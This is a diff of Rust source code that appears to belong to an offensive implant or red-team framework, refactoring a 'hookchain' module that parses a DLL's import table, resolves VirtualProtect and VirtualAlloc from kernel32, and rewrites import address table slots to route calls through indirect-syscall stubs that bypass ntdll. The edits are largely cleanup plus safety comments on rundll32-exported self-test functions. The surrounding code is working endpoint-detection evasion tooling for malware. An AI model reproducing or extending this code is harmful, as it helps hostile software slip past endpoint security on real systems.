@@ -100,7 +100,7 @@ fn ntdll_range() -> Option<(*mut u8, usize)> {
 /// True if `addr` falls within the in-process ntdll image range.
 fn is_in_ntdll(addr: usize, ntdll_base: *mut u8, ntdll_size: usize) -> bool {
     let start = ntdll_base as usize;
-    let end = start.checked_add(ntdll_size).unwrap_or(usize::MAX);
+    let end = start.saturating_add(ntdll_size);
     addr >= start && addr < end
 }
 
@@ -163,26 +163,24 @@ unsafe fn redirect_module_iat(module_base: *mut u8, rva_ssn: &[RvaSsn]) -> usize
     redirected
 }
 
-/// Resolve the runtime, the in-process ntdll range, the module's import
-/// directory and the kernel32 `VirtualProtect` export. Returns None if any
-/// prerequisite is missing (caller reports zero redirected slots).
-unsafe fn redirect_prepare(
-    module_base: *mut u8,
-) -> Option<(
+/// Prerequisites for the IAT redirect pass: indirect-syscall runtime,
+/// in-process ntdll range, the module's import directory, and kernel32
+/// `VirtualProtect` for the RW flip window.
+type RedirectPrep = (
     &'static syscalls::Runtime,
     *mut u8,
     usize,
     *const ImageImportDescriptor,
     unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32,
-)> {
-    let rt = match syscalls::global() {
-        Some(r) => r,
-        None => return None, // indirect-syscall runtime not initialized — cannot build stubs
-    };
-    let (ntdll_base, ntdll_size) = match ntdll_range() {
-        Some(r) => r,
-        None => return None,
-    };
+);
+
+/// Resolve the runtime, the in-process ntdll range, the module's import
+/// directory and the kernel32 `VirtualProtect` export. Returns None if any
+/// prerequisite is missing (caller reports zero redirected slots).
+unsafe fn redirect_prepare(module_base: *mut u8) -> Option<RedirectPrep> {
+    // indirect-syscall runtime not initialized — cannot build stubs
+    let rt = syscalls::global()?;
+    let (ntdll_base, ntdll_size) = ntdll_range()?;
 
     // PE parse: DOS → e_lfanew → NT → OptionalHeader → DataDirectory[1] (IMPORT).
     let e_lfanew = core::ptr::read_unaligned(module_base.add(0x3C) as *const i32) as usize;
@@ -202,10 +200,7 @@ unsafe fn redirect_prepare(
     let import_dir = module_base.add(import_rva) as *const ImageImportDescriptor;
 
     // Resolve VirtualProtect (kernel32) for the RW flip.
-    let vp_addr = match resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
-        Some(a) => a,
-        None => return None,
-    };
+    let vp_addr = resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
     type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
     let vp: VirtualProtect = core::mem::transmute(vp_addr);
 
@@ -399,10 +394,7 @@ unsafe fn alloc_stub_page() -> Option<usize> {
     if page != 0 {
         return Some(page);
     }
-    let va = match resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
-        Some(a) => a,
-        None => return None,
-    };
+    let va = resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
     type VirtualAlloc = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
     let f: VirtualAlloc = core::mem::transmute(va);
     // PAGE_EXECUTE_READ (0x20) — NOT RWX. We flip to RWX briefly for the
@@ -515,7 +507,7 @@ pub unsafe fn apply() -> usize {
         // Trim the NUL for module_base_by_name (it compares against the
         // loader's base_dll_name which doesn't include NUL).
         let trimmed = name.split(|&b| b == 0).next().unwrap_or(name);
-        if let Some(base) = unsafe { resolve::module_base_by_name(trimmed.as_ref()) } {
+        if let Some(base) = unsafe { resolve::module_base_by_name(trimmed) } {
             total += unsafe { redirect_module_iat(base, &rva_ssn) };
         }
     }
@@ -530,6 +522,11 @@ pub unsafe fn apply() -> usize {
 /// and reports the redirect count via exit code:
 ///   0xC0 = runtime not initialized (call after bootstrap)
 ///   0xC1..0xFE = count of redirected slots (capped)
+///
+/// # Safety
+/// Exported test entry point (via `rundll32`). Rewrites IAT slots of the
+/// subsystem DLLs in the host process and terminates it via `ExitProcess`;
+/// run only in a sacrificial test process.
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hookchain() {
@@ -559,6 +556,12 @@ pub unsafe extern "system" fn nyx_selftest_hookchain() {
 /// Exit codes:
 ///   0xC0 = runtime init failed (LiveNtdll::locate or SSN resolution failed)
 ///   0xC1..0xFE = count of redirected slots (capped). >0 = hookchain works.
+///
+/// # Safety
+/// Exported test entry point (via `rundll32`). Initializes the indirect-
+/// syscall runtime, rewrites IAT slots of the subsystem DLLs in the host
+/// process and terminates it via `ExitProcess`; run only in a sacrificial
+/// test process.
 #[cfg(feature = "selftest")]
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hookchain_full() {
